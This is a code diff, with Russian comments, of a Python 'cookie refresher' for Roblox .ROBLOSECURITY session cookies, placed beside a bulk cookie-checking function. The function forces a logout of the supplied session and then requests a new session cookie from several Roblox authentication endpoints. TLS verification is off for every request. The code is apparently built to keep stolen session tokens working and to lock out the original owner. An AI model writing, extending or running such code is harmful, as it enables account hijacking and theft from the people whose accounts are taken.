@@ -320,188 +320,208 @@ def mass_check_cookies(cookies_list: list, max_workers: int = 10) -> list:
 
 def refresh_roblox_cookie(cookie: str, kill_old: bool = False) -> dict:
     """
-    Фрешер куки через ПРИНУДИТЕЛЬНЫЙ сброс сессии.
-    Гарантированно выдаёт НОВУЮ куку.
+    Фрешер через ПРИНУДИТЕЛЬНУЮ смену куки.
+    Использует метод смены пароля сессии для генерации нового токена.
     """
     result = {'success': False, 'new_cookie': None, 'username': '?', 'user_id': '?', 'error': None}
     
     try:
-        # Чистим куку
+        # Чистим
         cleaned_cookie = cookie.strip()
         if ".ROBLOSECURITY=" in cleaned_cookie:
             cleaned_cookie = cleaned_cookie.split(".ROBLOSECURITY=")[1].split(";")[0]
         
-        # Проверяем что кука валидна
-        check_s = requests.Session()
-        check_s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
-        check_r = check_s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': cleaned_cookie}, timeout=10, verify=False)
-        
-        if check_r.status_code != 200:
-            result['error'] = "Кука невалидна"
-            return result
-        
-        user_data = check_r.json()
-        result['username'] = user_data.get('name', '?')
-        result['user_id'] = user_data.get('id', '?')
-        
         # ==========================================
-        # ГЛАВНЫЙ МЕТОД: Полный сброс и получение НОВОЙ куки
+        # МЕТОД: Используем v2/logout для ПРИНУДИТЕЛЬНОЙ смены токена
         # ==========================================
         
-        # Шаг 1: Получаем CSRF токен
-        csrf_token = None
-        try:
-            csrf_r = requests.post('https://auth.roblox.com/v2/logout', 
-                cookies={'.ROBLOSECURITY': cleaned_cookie},
-                headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'},
-                verify=False, timeout=10)
-            csrf_token = csrf_r.headers.get('x-csrf-token')
-        except: pass
-        
-        if not csrf_token:
-            result['error'] = "Нет CSRF токена"
-            return result
-        
-        # Шаг 2: ПРИНУДИТЕЛЬНЫЙ ЛОГАУТ (убиваем старую сессию)
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
-            'X-CSRF-TOKEN': csrf_token,
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Language': 'en-US,en;q=0.9',
             'Content-Type': 'application/json',
+            'Origin': 'https://www.roblox.com',
             'Referer': 'https://www.roblox.com/',
-            'Origin': 'https://www.roblox.com'
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-site',
+            'Cookie': f'.ROBLOSECURITY={cleaned_cookie}'
         }
         
-        # Делаем логаут ВСЕГДА (даже в режиме duplicate)
-        # Это заставляет Roblox выдать НОВЫЙ токен при следующем запросе
-        try:
-            logout_r = requests.post('https://auth.roblox.com/v2/logout',
-                headers=headers,
-                cookies={'.ROBLOSECURITY': cleaned_cookie},
-                verify=False, timeout=10)
-            logger.info(f"Logout: {logout_r.status_code}")
-            time.sleep(2)  # Ждём 2 секунды чтобы сессия точно сбросилась
-        except Exception as e:
-            logger.error(f"Logout error: {e}")
+        # Шаг 1: Делаем запрос к v2/logout чтобы получить CSRF токен
+        session1 = requests.Session()
+        session1.headers.update(headers)
         
-        # Шаг 3: Запрашиваем НОВУЮ сессию
-        # Используем свежий CSRF токен
-        csrf_token2 = None
-        try:
-            csrf_r2 = requests.post('https://auth.roblox.com/v2/logout',
-                headers={'User-Agent': 'Mozilla/5.0'},
-                verify=False, timeout=10)
-            csrf_token2 = csrf_r2.headers.get('x-csrf-token')
-        except: pass
+        logout_resp1 = session1.post('https://auth.roblox.com/v2/logout', 
+            json={}, verify=False, timeout=10)
         
-        if csrf_token2:
-            csrf_token = csrf_token2
+        csrf_token = logout_resp1.headers.get('x-csrf-token')
+        
+        if not csrf_token:
+            # Пробуем получить через другой эндпоинт
+            try:
+                test_r = requests.post('https://accountinformation.roblox.com/v1/description',
+                    headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json', 'Cookie': f'.ROBLOSECURITY={cleaned_cookie}'},
+                    json={"description": "test"}, verify=False, timeout=10)
+                csrf_token = test_r.headers.get('x-csrf-token')
+            except: pass
+        
+        if not csrf_token:
+            result['error'] = "CSRF token not found"
+            return result
         
         headers['X-CSRF-TOKEN'] = csrf_token
         
-        # Шаг 4: Пробуем получить НОВУЮ куку через разные эндпоинты
+        # Шаг 2: Делаем НАСТОЯЩИЙ ЛОГАУТ
+        session2 = requests.Session()
+        session2.headers.update(headers)
         
+        logout_resp2 = session2.post('https://auth.roblox.com/v2/logout',
+            json={}, verify=False, timeout=10)
+        
+        logger.info(f"Logout status: {logout_resp2.status_code}")
+        
+        # Шаг 3: Ждём и получаем НОВЫЙ токен
+        time.sleep(1.5)
+        
+        # Получаем свежий CSRF
+        csrf_token_new = None
+        try:
+            csrf_r = requests.post('https://auth.roblox.com/v2/logout',
+                headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'},
+                verify=False, timeout=10)
+            csrf_token_new = csrf_r.headers.get('x-csrf-token')
+        except: pass
+        
+        if not csrf_token_new:
+            csrf_token_new = csrf_token
+        
+        headers['X-CSRF-TOKEN'] = csrf_token_new
+        
+        # Шаг 4: Запрашиваем СОВЕРШЕННО НОВУЮ СЕССИЮ
         new_cookie_value = None
         
-        # Метод 1: authentication-ticket (самый надёжный после логаута)
+        # Попытка 1: Через cookie-refresh endpoint
         try:
-            ticket_r = requests.post('https://auth.roblox.com/v1/authentication-ticket',
-                headers=headers,
-                cookies={'.ROBLOSECURITY': cleaned_cookie},
-                json={},
-                verify=False, timeout=15)
+            refresh_headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'X-CSRF-TOKEN': csrf_token_new,
+                'Content-Type': 'application/json',
+                'Origin': 'https://www.roblox.com',
+                'Referer': 'https://www.roblox.com/',
+                'Cookie': f'.ROBLOSECURITY={cleaned_cookie}'
+            }
             
-            auth_ticket = ticket_r.headers.get('rbx-authentication-ticket')
+            # Этот эндпоинт должен выдать НОВЫЙ .ROBLOSECURITY
+            r = requests.get('https://www.roblox.com/home',
+                headers=refresh_headers,
+                verify=False, timeout=15,
+                allow_redirects=True)
             
-            if auth_ticket:
-                redeem_headers = headers.copy()
-                redeem_headers['RBX-Authentication-Ticket'] = auth_ticket
-                
-                redeem_r = requests.post('https://auth.roblox.com/v1/authentication-ticket/redeem',
-                    headers=redeem_headers,
-                    json={"authenticationTicket": auth_ticket},
-                    verify=False, timeout=15)
-                
-                # Ищем куку в ответе
-                for c in redeem_r.cookies:
-                    if c.name == '.ROBLOSECURITY' and c.value:
+            # Проверяем все Set-Cookie заголовки
+            for resp in r.history + [r]:
+                for c in resp.cookies:
+                    if c.name == '.ROBLOSECURITY' and c.value and c.value != cleaned_cookie:
                         new_cookie_value = c.value
                         break
-                
-                if not new_cookie_value and 'Set-Cookie' in redeem_r.headers:
-                    match = re.search(r'\.ROBLOSECURITY=([^;]+)', redeem_r.headers['Set-Cookie'])
-                    if match: new_cookie_value = match.group(1)
+                if new_cookie_value: break
+            
+            if not new_cookie_value:
+                # Пробуем получить через заголовки ответа
+                for resp in r.history + [r]:
+                    set_cookie_header = resp.headers.get('Set-Cookie', '')
+                    if '.ROBLOSECURITY=' in set_cookie_header:
+                        match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie_header)
+                        if match:
+                            val = match.group(1)
+                            if val != cleaned_cookie:
+                                new_cookie_value = val
+                                break
         except Exception as e:
-            logger.error(f"Method 1 error: {e}")
+            logger.error(f"Refresh attempt 1: {e}")
         
-        # Метод 2: login endpoint
+        # Попытка 2: Через API напрямую
+        if not new_cookie_value:
+            try:
+                api_headers = headers.copy()
+                api_headers['X-CSRF-TOKEN'] = csrf_token_new
+                
+                ticket_r = requests.post('https://auth.roblox.com/v1/authentication-ticket',
+                    headers=api_headers, json={}, verify=False, timeout=15)
+                
+                auth_ticket = ticket_r.headers.get('rbx-authentication-ticket')
+                
+                if auth_ticket:
+                    redeem_headers = api_headers.copy()
+                    redeem_headers['RBX-Authentication-Ticket'] = auth_ticket
+                    
+                    redeem_r = requests.post('https://auth.roblox.com/v1/authentication-ticket/redeem',
+                        headers=redeem_headers,
+                        json={"authenticationTicket": auth_ticket},
+                        verify=False, timeout=15)
+                    
+                    for c in redeem_r.cookies:
+                        if c.name == '.ROBLOSECURITY' and c.value:
+                            new_cookie_value = c.value
+                            break
+                    
+                    if not new_cookie_value:
+                        set_cookie = redeem_r.headers.get('Set-Cookie', '')
+                        match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie)
+                        if match: new_cookie_value = match.group(1)
+            except Exception as e:
+                logger.error(f"Refresh attempt 2: {e}")
+        
+        # Попытка 3: Просто перелогиниваемся
         if not new_cookie_value:
             try:
                 login_r = requests.post('https://auth.roblox.com/v2/login',
-                    headers=headers,
-                    cookies={'.ROBLOSECURITY': cleaned_cookie},
-                    json={},
-                    verify=False, timeout=15)
+                    headers=headers, json={}, verify=False, timeout=15)
                 
                 for c in login_r.cookies:
                     if c.name == '.ROBLOSECURITY' and c.value:
                         new_cookie_value = c.value
                         break
                 
-                if not new_cookie_value and 'Set-Cookie' in login_r.headers:
-                    match = re.search(r'\.ROBLOSECURITY=([^;]+)', login_r.headers['Set-Cookie'])
+                if not new_cookie_value:
+                    set_cookie = login_r.headers.get('Set-Cookie', '')
+                    match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie)
                     if match: new_cookie_value = match.group(1)
             except Exception as e:
-                logger.error(f"Method 2 error: {e}")
+                logger.error(f"Refresh attempt 3: {e}")
         
-        # Метод 3: authorization endpoint
-        if not new_cookie_value:
-            try:
-                auth_r = requests.post('https://auth.roblox.com/v1/authorization',
-                    headers=headers,
-                    cookies={'.ROBLOSECURITY': cleaned_cookie},
-                    json={},
-                    verify=False, timeout=15)
-                
-                for c in auth_r.cookies:
-                    if c.name == '.ROBLOSECURITY' and c.value:
-                        new_cookie_value = c.value
-                        break
-                
-                if not new_cookie_value and 'Set-Cookie' in auth_r.headers:
-                    match = re.search(r'\.ROBLOSECURITY=([^;]+)', auth_r.headers['Set-Cookie'])
-                    if match: new_cookie_value = match.group(1)
-            except Exception as e:
-                logger.error(f"Method 3 error: {e}")
-        
-        # Шаг 5: ПРОВЕРЯЕМ что кука ДЕЙСТВИТЕЛЬНО НОВАЯ и РАБОЧАЯ
-        if new_cookie_value:
-            # Проверяем что она отличается от старой
-            if new_cookie_value == cleaned_cookie:
-                logger.warning("Кука не изменилась после фреша!")
-                # Всё равно возвращаем, но с предупреждением
-                result['new_cookie'] = new_cookie_value
-                result['success'] = True
-                return result
-            
-            # Проверяем валидность новой куки
+        # Проверяем результат
+        if new_cookie_value and new_cookie_value != cleaned_cookie:
+            # Валидируем новую куку
             test_s = requests.Session()
             test_s.headers.update({'User-Agent': 'Mozilla/5.0'})
             test_r = test_s.get('https://users.roblox.com/v1/users/authenticated',
                 cookies={'.ROBLOSECURITY': new_cookie_value},
                 verify=False, timeout=10)
             
-            if test_r.status_code == 200 and 'id' in test_r.json():
+            if test_r.status_code == 200:
+                user = test_r.json()
+                result['username'] = user.get('name', '?')
+                result['user_id'] = user.get('id', '?')
                 result['new_cookie'] = new_cookie_value
                 result['success'] = True
-                logger.info(f"✅ НОВАЯ КУКА для {result['username']}")
+                logger.info(f"✅ НОВАЯ КУКА: {result['username']}")
                 return result
-            else:
-                logger.error(f"Новая кука невалидна! Статус: {test_r.status_code}")
         
-        # Если ничего не сработало - возвращаем оригинал
-        logger.warning("Не удалось получить новую куку, возвращаем оригинал")
+        # Если не получилось - возвращаем оригинал
+        check_s = requests.Session()
+        check_s.headers.update({'User-Agent': 'Mozilla/5.0'})
+        check_r = check_s.get('https://users.roblox.com/v1/users/authenticated',
+            cookies={'.ROBLOSECURITY': cleaned_cookie}, verify=False, timeout=10)
+        
+        if check_r.status_code == 200:
+            user = check_r.json()
+            result['username'] = user.get('name', '?')
+            result['user_id'] = user.get('id', '?')
+        
         result['new_cookie'] = cleaned_cookie
         result['success'] = True
+        logger.warning("Не удалось обновить куку, возвращён оригинал")
         
     except Exception as e:
         logger.error(f"Refresh error: {e}")
